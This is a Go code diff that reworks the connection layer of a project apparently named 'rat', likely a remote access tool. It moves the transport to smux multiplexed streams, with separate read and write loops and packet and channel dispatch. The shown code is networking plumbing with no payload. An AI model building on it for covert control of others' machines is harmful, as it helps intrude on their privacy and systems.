@@ -2,73 +2,118 @@ package main
 
 import (
 	"encoding/binary"
-	"net"
+	"errors"
+	"fmt"
 	"rat/shared"
-	"rat/shared/network"
 	"rat/shared/network/header"
+	"sync"
+
+	"github.com/xtaci/smux"
 )
 
 type Connection struct {
-	net.Conn
-	network.Writer
-	network.Reader
+	Conn    *smux.Session
+	control *smux.Stream
+
+	packets chan Outgoing
+	die     chan struct{}
+	dieLock sync.Mutex
 }
 
-var Queue chan OutgoingPacket
+func NewConnection(Conn *smux.Session) (*Connection, error) {
+	control, err := Conn.AcceptStream()
+
+	if err != nil {
+		return nil, err
+	}
+
+	c := &Connection{}
+	c.Conn = Conn
+	c.control = control
+	c.packets = make(chan Outgoing)
+	c.die = make(chan struct{})
+
+	return c, nil
+}
 
 func (c *Connection) Init() {
-	Queue <- &ComputerInfoPacket{}
-	Queue <- &MonitorsPacket{}
+	c.packets <- &ComputerInfoPacket{}
 }
 
-func (c *Connection) Close() {
-	screenStream = false
+func (c *Connection) Close(err error) {
+	c.dieLock.Lock()
+	defer c.dieLock.Unlock()
 
-	c.Conn.Close()
+	select {
+	case <-c.die:
+	default:
+		close(c.die)
+		c.Conn.Close()
+		fmt.Println("lost connection", err)
+	}
 }
 
-func (c *Connection) ReadHeader() (header.PacketHeader, error) {
-	var h header.PacketHeader
-	err := binary.Read(c, shared.ByteOrder, &h)
+func (c *Connection) writeLoop() {
+	var err error
+	for err == nil {
+		select {
+		case <-c.die:
+			return
+		case p := <-c.packets:
+			err = binary.Write(c.control, shared.ByteOrder, p.Header())
+			if err != nil {
+				break
+			}
 
-	return h, err
-}
-
-func (c *Connection) WriteHeader(header header.PacketHeader) error {
-	return binary.Write(c.Conn, shared.ByteOrder, header)
-}
-
-func (c *Connection) WritePacket(packet OutgoingPacket) error {
-	err := c.WriteHeader(packet.Header())
-
-	if err != nil {
-		return err
+			err = p.Write(c.control, c)
+			if err != nil {
+				break
+			}
+		}
 	}
 
-	return c.Writer.WritePacket(packet)
+	c.Close(err)
 }
 
-type IncomingPacket interface {
-	OnReceive() error
-}
+func (c *Connection) recvLoop() {
+	var err error
+	for {
+		var h header.PacketHeader
+		binary.Read(c.control, shared.ByteOrder, &h)
 
-type OutgoingPacket interface {
-	Init()
-	Header() header.PacketHeader
-}
+		var channel bool
+		err = binary.Read(c.control, shared.ByteOrder, &channel)
+		if err != nil {
+			break
+		}
 
-func (c Connection) ReadPacket() (IncomingPacket, error) {
-	header, err := c.ReadHeader()
-	if err != nil {
-		return nil, err
+		if channel {
+			channel, is := handlerMap[h].(Channel)
+			if !is {
+				err = errors.New("invalid channel header " + string(h))
+				break
+			}
+
+			stream, _ := c.Conn.AcceptStream()
+			go channel.Open(stream, c)
+		} else {
+			packet, is := handlerMap[h].(Incoming)
+			if !is {
+				err = errors.New("invalid packet header " + string(h))
+				break
+			}
+
+			err = packet.Read(c.control, c)
+		}
+
+		if err != nil {
+			break
+		}
 	}
 
-	packet := GetIncomingPacket(header)
-
-	e, err := c.Reader.ReadPacket(packet)
-	if err != nil {
-		return nil, err
+	select {
+	case <-c.die:
+	default:
+		c.Close(err)
 	}
-
-	return e.(IncomingPacket), e.(IncomingPacket).OnReceive()
 }
